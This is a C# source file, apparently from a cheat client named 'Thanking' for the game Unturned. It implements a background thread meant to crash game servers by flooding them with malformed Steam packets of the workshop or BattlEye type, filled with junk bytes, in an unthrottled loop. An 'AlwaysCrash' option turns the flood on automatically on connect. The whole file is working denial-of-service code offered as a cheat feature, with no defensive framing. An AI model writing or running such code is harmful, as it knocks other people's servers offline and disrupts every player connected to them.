using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Xml.Schema;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            byte[] P1 = {(byte) ESteamPacket.WORKSHOP, 69, 69};
            byte[] P2 = {(byte) ESteamPacket.BATTLEYE, 69, 69};

            int S1 = P1.Length;
            int S2 = P2.Length;
            
            while (true)
            {
                if (AlwaysCrash && OV_Provider.IsConnected)
                    ServerCrashEnabled = true;

                if (ServerCrashEnabled)
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, P1, S1, 0);
                            break;
                        case 2:
                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P2, S2, 0);
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }
    }
}
